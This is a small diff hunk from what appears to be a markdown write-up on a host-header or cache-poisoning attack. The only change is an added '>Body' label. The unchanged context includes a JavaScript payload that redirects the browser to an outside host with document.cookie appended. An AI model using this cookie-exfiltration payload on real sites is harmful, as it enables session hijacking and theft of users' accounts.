@@ -400,6 +400,8 @@ X-Host: EXPLOIT.net
   
 ![exploit host tracking.js](images/exploit-host-tracking-js.png)  
   
+>Body  
+  
 ```javascript
 document.location='https://collaboration.net/?cookies='+document.cookie;
 ```  
